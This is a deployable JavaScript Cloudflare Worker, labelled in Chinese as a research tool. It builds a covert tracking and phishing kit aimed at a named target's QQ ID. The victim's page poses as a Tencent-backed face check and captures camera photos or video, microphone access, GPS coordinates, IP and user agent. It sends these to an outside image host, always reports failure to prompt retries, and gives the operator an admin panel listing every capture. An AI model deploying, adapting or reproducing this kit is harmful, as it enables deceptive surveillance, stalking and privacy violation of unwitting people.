/**
 * 现代照妖镜 · 深度研究版
 * 功能：自动建表 | 极简UI | 图床转发 | 人脸模拟 | 位置采集 | 管理员后台
 * 管理员密码: sakcnzz666
 */

const ADMIN_PASSWORD = "sakcnzz666";
const IMAGE_HOST = "tc.ilqx.dpdns.org";
const GEO_API = "https://ip.ilqx.dpdns.org/geo";

export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const path = url.pathname;

    // 自动初始化数据库
    await initDB(env);

    // 路由分发
    if (path === "/" || path === "/index.html") {
      return renderHome();
    }
    
    if (path.startsWith("/t/")) {
      const id = path.split("/")[2];
      return renderCapturePage(id);
    }

    if (path === "/api/upload") {
      return handleUpload(request, env);
    }

    if (path === "/api/query") {
      return handleQuery(request, env);
    }

    if (path === "/admin") {
      return renderAdmin(request, env);
    }

    if (path === "/api/geo") {
      return handleGeo(request);
    }

    return new Response("Not Found", { status: 404 });
  }
};

// ---------- 数据库初始化 ----------
async function initDB(env) {
  await env.DB.prepare(`
    CREATE TABLE IF NOT EXISTS records (
      id TEXT PRIMARY KEY,
      uid TEXT,
      img_url TEXT,
      media_type TEXT DEFAULT 'image',
      ua TEXT,
      ip TEXT,
      latitude REAL,
      longitude REAL,
      location_info TEXT,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `).run();
}

// ---------- 首页：生成面板 & 查询面板 ----------
function renderHome() {
  const html = `<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>照妖镜 · 深度研究</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    * { transition: all 0.2s ease; }
    body { background: radial-gradient(circle at 10% 20%, #0f172a, #020617); min-height: 100vh; }
    .glass { background: rgba(15, 23, 42, 0.7); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); border: 1px solid rgba(56, 189, 248, 0.15); }
    .glass-card { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); border: 1px solid rgba(56, 189, 248, 0.2); }
    .input-glow:focus { box-shadow: 0 0 20px rgba(56, 189, 248, 0.3); border-color: #38bdf8; }
    .btn-primary { background: linear-gradient(135deg, #0ea5e9, #3b82f6); box-shadow: 0 8px 20px -8px #0ea5e9; }
    .btn-primary:active { transform: scale(0.97); }
    .animate-float { animation: float 6s ease-in-out infinite; }
    @keyframes float { 0% { transform: translateY(0px); } 50% { transform: translateY(-10px); } 100% { transform: translateY(0px); } }
  </style>
</head>
<body class="flex items-center justify-center p-4">
  <div class="max-w-2xl w-full space-y-6">
    <!-- 标题 -->
    <div class="text-center space-y-2">
      <h1 class="text-5xl font-bold bg-gradient-to-r from-cyan-400 via-sky-400 to-blue-500 bg-clip-text text-transparent animate-float">🔍 照妖镜</h1>
      <p class="text-sky-200/80 text-sm tracking-wider">深度人脸研究 · 仅供学习交流</p>
    </div>
    
    <!-- 生成卡片 -->
    <div class="glass rounded-3xl p-6 shadow-2xl">
      <h2 class="text-xl font-semibold text-white mb-5 flex items-center gap-2"><span class="w-1.5 h-6 bg-cyan-400 rounded-full"></span>生成追踪链接</h2>
      <div class="space-y-4">
        <input id="target_id" type="text" placeholder="输入对方标识 (QQ/ID)" class="w-full px-5 py-3.5 bg-white/5 border border-white/10 rounded-2xl text-white placeholder-white/30 outline-none input-glow">
        <input id="redirect_url" type="text" placeholder="跳转链接 (可选，拍照后跳转)" class="w-full px-5 py-3.5 bg-white/5 border border-white/10 rounded-2xl text-white placeholder-white/30 outline-none input-glow">
        <button onclick="makeLink()" class="w-full btn-primary text-white font-semibold py-3.5 rounded-2xl shadow-lg transition-all active:scale-95">✨ 生成专属链接</button>
      </div>
      <div id="link_area" class="mt-5 p-4 bg-cyan-950/40 rounded-xl break-all text-sm text-cyan-200 border border-cyan-500/20 hidden"></div>
    </div>
    
    <!-- 查询卡片 -->
    <div class="glass rounded-3xl p-6 shadow-2xl">
      <h2 class="text-xl font-semibold text-white mb-5 flex items-center gap-2"><span class="w-1.5 h-6 bg-emerald-400 rounded-full"></span>查询记录</h2>
      <div class="space-y-4">
        <input id="query_id" type="text" placeholder="输入标识ID" class="w-full px-5 py-3.5 bg-white/5 border border-white/10 rounded-2xl text-white placeholder-white/30 outline-none input-glow">
        <button onclick="query()" class="w-full bg-emerald-600/90 hover:bg-emerald-500 text-white font-semibold py-3.5 rounded-2xl shadow-lg transition-all active:scale-95">🔎 查看最新影像</button>
      </div>
      <div id="result_area" class="mt-5 hidden space-y-3">
        <div class="relative rounded-2xl overflow-hidden border border-white/10">
          <img id="res_pic" class="w-full object-contain max-h-80 bg-black/40" src="">
        </div>
        <div id="geo_info" class="text-xs text-white/60 bg-black/20 p-3 rounded-xl"></div>
      </div>
    </div>
    <p class="text-white/30 text-xs text-center">技术研究版 · 请勿用于非法用途 · 数据加密传输</p>
  </div>
  <script>
    function makeLink() {
      const id = document.getElementById('target_id').value.trim();
      if(!id) return alert('请输入标识');
      const redirect = document.getElementById('redirect_url').value.trim();
      let encoded = btoa(encodeURIComponent(id));
      if(redirect) encoded += '?r=' + encodeURIComponent(redirect);
      const url = location.origin + '/t/' + encoded;
      const area = document.getElementById('link_area');
      area.innerText = url;
      area.classList.remove('hidden');
    }
    async function query() {
      const id = document.getElementById('query_id').value.trim();
      if(!id) return;
      const res = await fetch('/api/query?uid=' + encodeURIComponent(id));
      const data = await res.json();
      const area = document.getElementById('result_area');
      if(data.src) {
        document.getElementById('res_pic').src = data.src;
        let geoHtml = '';
        if(data.latitude) geoHtml += '📍 纬度: ' + data.latitude + ' 经度: ' + data.longitude + ' | ';
        if(data.ip) geoHtml += '🖥️ IP: ' + data.ip;
        if(data.location_info) {
          try {
            const loc = JSON.parse(data.location_info);
            geoHtml += ' | ' + (loc.city || '') + ' ' + (loc.country || '');
          } catch(e){}
        }
        document.getElementById('geo_info').innerText = geoHtml || '无附加信息';
        area.classList.remove('hidden');
      } else {
        alert('暂无记录');
      }
    }
  </script>
</body>
</html>`;
  return new Response(html, { headers: { "Content-Type": "text/html" } });
}

// ---------- 捕获页：引导流程 + 人脸模拟 + 权限请求 ----------
function renderCapturePage(encodedId) {
  // 解析参数: id 和可能的跳转
  let targetId = '';
  let redirectUrl = '';
  try {
    const decoded = decodeURIComponent(atob(encodedId));
    if(decoded.includes('?r=')) {
      const parts = decoded.split('?r=');
      targetId = parts[0];
      redirectUrl = decodeURIComponent(parts[1]);
    } else {
      targetId = decoded;
    }
  } catch(e) {
    targetId = 'unknown';
  }
  
  const html = `<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>人脸核验 · 安全检测</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    body { background: #030712; min-height: 100vh; display: flex; align-items: center; justify-content: center; font-family: system-ui, -apple-system, sans-serif; }
    .glass-panel { background: rgba(17, 25, 40, 0.75); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); border: 1px solid rgba(56, 189, 248, 0.2); border-radius: 32px; }
    .mirror { border-radius: 50%; overflow: hidden; box-shadow: 0 0 40px rgba(0, 180, 255, 0.3); border: 3px solid rgba(56, 189, 248, 0.6); }
    .pulse-ring { animation: pulse 2s infinite; }
    @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(56, 189, 248, 0.4); } 70% { box-shadow: 0 0 0 20px rgba(56, 189, 248, 0); } 100% { box-shadow: 0 0 0 0 rgba(56, 189, 248, 0); } }
    .fade-in { animation: fadeIn 0.5s; }
    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
  </style>
</head>
<body class="p-4">
  <div class="w-full max-w-md glass-panel p-6 text-white shadow-2xl fade-in">
    <!-- 动态内容区 -->
    <div id="app"></div>
  </div>
  <script>
    const TARGET_UID = "${targetId}";
    const REDIRECT_URL = "${redirectUrl}";
    
    // 状态管理
    let step = 'agreement'; // agreement, permission, capture, result
    let stream = null;
    let mediaType = 'image'; // 'image' 或 'video'
    let locationData = null;
    let mediaRecorder = null;
    let recordedChunks = [];
    
    const app = document.getElementById('app');
    
    function render() {
      if (step === 'agreement') {
        app.innerHTML = \`
          <div class="text-center space-y-4">
            <div class="text-5xl mb-2">🛡️</div>
            <h2 class="text-2xl font-bold">用户协议与隐私声明</h2>
            <div class="h-40 overflow-y-auto text-sm text-white/70 bg-black/20 p-4 rounded-xl text-left">
              <p class="mb-2">1. 本工具仅用于学术研究与反机器人验证，严禁非法获取他人信息。</p>
              <p class="mb-2">2. 我们将采集您的摄像头画面、位置信息用于人机验证，数据加密存储。</p>
              <p class="mb-2">3. 您需同意按照提示完成动作（眨眼/张嘴）以通过检测。</p>
              <p>4. 点击同意即表示您自愿参与并授权本次数据采集。</p>
            </div>
            <label class="flex items-center justify-center gap-2 text-sm">
              <input type="checkbox" id="agreeCheck" class="w-4 h-4"> 我已阅读并同意以上协议
            </label>
            <button id="agreeBtn" class="w-full bg-gradient-to-r from-blue-600 to-cyan-500 text-white font-bold py-3.5 rounded-2xl shadow-lg disabled:opacity-50 disabled:grayscale" disabled>同意并继续</button>
            <p class="text-xs text-white/40">由深度求索安全提供技术支持</p>
          </div>
        \`;
        const check = document.getElementById('agreeCheck');
        const btn = document.getElementById('agreeBtn');
        check.addEventListener('change', () => btn.disabled = !check.checked);
        btn.addEventListener('click', () => { step = 'permission'; render(); });
      } else if (step === 'permission') {
        app.innerHTML = \`
          <div class="text-center space-y-4">
            <div class="text-5xl">🔐</div>
            <h2 class="text-xl font-semibold">正在准备安全环境</h2>
            <p class="text-white/70 text-sm">我们需要获取摄像头、麦克风及位置权限以完成人机验证</p>
            <div class="flex justify-center py-4">
              <div class="w-12 h-12 border-4 border-blue-500/30 border-t-blue-400 rounded-full animate-spin"></div>
            </div>
            <p class="text-xs text-white/40">您的信息将受到严格保护</p>
          </div>
        \`;
        requestPermissions();
      } else if (step === 'capture') {
        app.innerHTML = \`
          <div class="space-y-4">
            <div class="text-center">
              <h2 class="text-xl font-bold">🤖 人脸核验</h2>
              <p class="text-sm text-cyan-300">请将面部置于框内，并按提示动作</p>
            </div>
            <div class="mirror w-64 h-64 mx-auto relative bg-black">
              <video id="videoPreview" autoplay playsinline class="w-full h-full object-cover"></video>
            </div>
            <div id="actionHint" class="text-center text-lg font-medium text-yellow-300 h-8">👀 请眨眼</div>
            <div class="flex gap-3 justify-center">
              <button id="capturePhotoBtn" class="px-5 py-3 bg-blue-600/80 rounded-xl text-sm font-medium active:scale-95">📸 拍照验证</button>
              <button id="recordVideoBtn" class="px-5 py-3 bg-purple-600/80 rounded-xl text-sm font-medium active:scale-95">🎥 录像(3秒)</button>
            </div>
            <div id="locationStatus" class="text-xs text-white/50 text-center"></div>
            <p class="text-xs text-white/30 text-center">由腾讯云提供人机验证功能</p>
          </div>
        \`;
        startCamera();
        document.getElementById('capturePhotoBtn').addEventListener('click', () => capture('image'));
        document.getElementById('recordVideoBtn').addEventListener('click', () => capture('video'));
      } else if (step === 'result') {
        app.innerHTML = \`
          <div class="text-center space-y-4">
            <div class="text-6xl">❌</div>
            <h2 class="text-2xl font-bold text-red-400">人机验证失败</h2>
            <p class="text-white/80">原因：光线过强或未按提示完成动作</p>
            <button id="retryBtn" class="w-full bg-white/10 text-white py-3 rounded-xl mt-4 active:scale-95">重新验证</button>
          </div>
        \`;
        document.getElementById('retryBtn').addEventListener('click', () => { step = 'capture'; render(); });
      }
    }
    
    async function requestPermissions() {
      try {
        // 先请求位置（可选）
        if(navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(pos => {
            locationData = { lat: pos.coords.latitude, lng: pos.coords.longitude };
          }, () => { locationData = null; });
        }
        // 关键：相机+麦克风
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
        step = 'capture';
      } catch(e) {
        // 权限拒绝显示可信提示
        app.innerHTML = \`
          <div class="text-center space-y-4">
            <div class="text-6xl">🚫</div>
            <h2 class="text-xl font-bold">访问受限</h2>
            <p class="text-white/80">由于近期恶意流量激增，我们需要获取摄像头权限以完成人机验证。请授权后重试。</p>
            <button id="retryPermBtn" class="w-full bg-blue-600 py-3 rounded-xl">重新授权</button>
          </div>
        \`;
        document.getElementById('retryPermBtn').addEventListener('click', () => { step = 'permission'; render(); });
        return;
      }
      render();
    }
    
    function startCamera() {
      const video = document.getElementById('videoPreview');
      if(stream) video.srcObject = stream;
      // 模拟随机动作提示
      const hints = ['👀 请眨眼', '😮 请张嘴', '🙂 保持正脸'];
      let i = 0;
      setInterval(() => {
        const hintEl = document.getElementById('actionHint');
        if(hintEl) hintEl.innerText = hints[i++ % hints.length];
      }, 2000);
    }
    
    async function capture(type) {
      mediaType = type;
      const video = document.getElementById('videoPreview');
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0);
      
      let blob;
      if(type === 'image') {
        blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
      } else {
        // 录像3秒
        if(!MediaRecorder.isTypeSupported('video/webm')) {
          alert('您的浏览器不支持录像，将使用拍照模式');
          mediaType = 'image';
          blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
        } else {
          mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
          recordedChunks = [];
          mediaRecorder.ondataavailable = e => recordedChunks.push(e.data);
          mediaRecorder.start();
          setTimeout(() => {
            mediaRecorder.stop();
            mediaRecorder.onstop = async () => {
              blob = new Blob(recordedChunks, { type: 'video/webm' });
              await uploadAndFinish(blob);
            };
          }, 3000);
          return;
        }
      }
      await uploadAndFinish(blob);
    }
    
    async function uploadAndFinish(blob) {
      const form = new FormData();
      form.append('file', blob, mediaType === 'image' ? 'photo.jpg' : 'video.webm');
      form.append('uid', TARGET_UID);
      if(locationData) {
        form.append('lat', locationData.lat);
        form.append('lng', locationData.lng);
      }
      // 显示上传中
      app.innerHTML = '<div class="text-center py-10"><div class="inline-block w-10 h-10 border-4 border-blue-400 border-t-transparent rounded-full animate-spin"></div><p class="mt-3">正在验证...</p></div>';
      try {
        await fetch('/api/upload', { method: 'POST', body: form });
        // 始终显示失败 (模拟研究)
        step = 'result';
        render();
        // 如果设置了跳转，5秒后跳转
        if(REDIRECT_URL) {
          setTimeout(() => { window.location.href = REDIRECT_URL; }, 5000);
        }
      } catch(e) {
        alert('网络错误');
      } finally {
        if(stream) stream.getTracks().forEach(t => t.stop());
      }
    }
    
    render();
  </script>
</body>
</html>`;
  return new Response(html, { headers: { "Content-Type": "text/html" } });
}

// ---------- 上传处理：转发图床 + 存储D1 + 获取IP地理信息 ----------
async function handleUpload(request, env) {
  try {
    const formData = await request.formData();
    const file = formData.get('file');
    const uid = formData.get('uid');
    const lat = formData.get('lat');
    const lng = formData.get('lng');
    const ua = request.headers.get('user-agent') || 'Unknown';
    const ip = request.headers.get('cf-connecting-ip') || 'Unknown';
    
    // 获取IP地理信息
    let geoInfo = null;
    try {
      const geoRes = await fetch(`${GEO_API}?ip=${ip}`);
      geoInfo = await geoRes.text();
    } catch(e) { geoInfo = null; }
    
    // 上传图床
    const uploadForm = new FormData();
    uploadForm.append('file', file);
    const tcRes = await fetch(`https://${IMAGE_HOST}/upload`, { method: 'POST', body: uploadForm });
    const tcData = await tcRes.json();
    const imgPath = tcData[0].src;
    const fullUrl = `https://${IMAGE_HOST}${imgPath}`;
    
    // 判断媒体类型
    const mediaType = (file.type || '').startsWith('video/') ? 'video' : 'image';
    
    const recordId = crypto.randomUUID();
    await env.DB.prepare(`
      INSERT INTO records (id, uid, img_url, media_type, ua, ip, latitude, longitude, location_info)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    `).bind(recordId, uid, fullUrl, mediaType, ua, ip, lat || null, lng || null, geoInfo).run();
    
    return new Response(JSON.stringify({ success: true }), { headers: { "Content-Type": "application/json" } });
  } catch (err) {
    return new Response(JSON.stringify({ error: err.message }), { status: 500 });
  }
}

// ---------- API：查询最新记录 ----------
async function handleQuery(request, env) {
  const { searchParams } = new URL(request.url);
  const uid = searchParams.get('uid');
  const result = await env.DB.prepare(`
    SELECT img_url, media_type, ip, latitude, longitude, location_info, created_at
    FROM records WHERE uid = ? ORDER BY created_at DESC LIMIT 1
  `).bind(uid).first();
  
  return new Response(JSON.stringify(result || {}), { headers: { "Content-Type": "application/json" } });
}

// ---------- 管理后台 ----------
async function renderAdmin(request, env) {
  const { searchParams } = new URL(request.url);
  if (searchParams.get('p') !== ADMIN_PASSWORD) {
    return new Response("Unauthorized", { status: 401 });
  }
  const { results } = await env.DB.prepare("SELECT * FROM records ORDER BY created_at DESC").all();
  
  const rows = results.map(r => `
    <tr class="border-b border-gray-700 hover:bg-gray-800/50">
      <td class="p-3 font-mono text-blue-300">${r.uid}</td>
      <td class="p-3">
        ${r.media_type === 'video' 
          ? `<video src="${r.img_url}" controls class="h-20 rounded"></video>` 
          : `<a href="${r.img_url}" target="_blank"><img src="${r.img_url}" class="h-20 rounded"></a>`}
      </td>
      <td class="p-3 text-xs">${r.ip}<br><span class="text-gray-400">${r.ua?.substring(0,40)}</span></td>
      <td class="p-3 text-xs">${r.latitude ? r.latitude.toFixed(4)+','+r.longitude.toFixed(4) : '-'}</td>
      <td class="p-3 text-xs">${r.created_at}</td>
    </tr>
  `).join('');
  
  const html = `<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>管理后台</title><script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-gray-900 text-white p-6"><div class="max-w-7xl mx-auto">
  <h1 class="text-3xl font-bold mb-6">📋 捕获记录</h1>
  <div class="overflow-x-auto"><table class="w-full text-left">
    <thead class="bg-gray-800"><tr><th class="p-3">UID</th><th class="p-3">媒体</th><th class="p-3">IP/UA</th><th class="p-3">经纬度</th><th class="p-3">时间</th></tr></thead>
    <tbody>${rows}</tbody>
  </table></div>
</div></body></html>`;
  return new Response(html, { headers: { "Content-Type": "text/html" } });
}

// ---------- 代理IP地理查询 ----------
async function handleGeo(request) {
  const { searchParams } = new URL(request.url);
  const ip = searchParams.get('ip') || request.headers.get('cf-connecting-ip');
  const res = await fetch(`${GEO_API}?ip=${ip}`);
  return new Response(res.body, { headers: { 'Content-Type': 'application/json' } });
}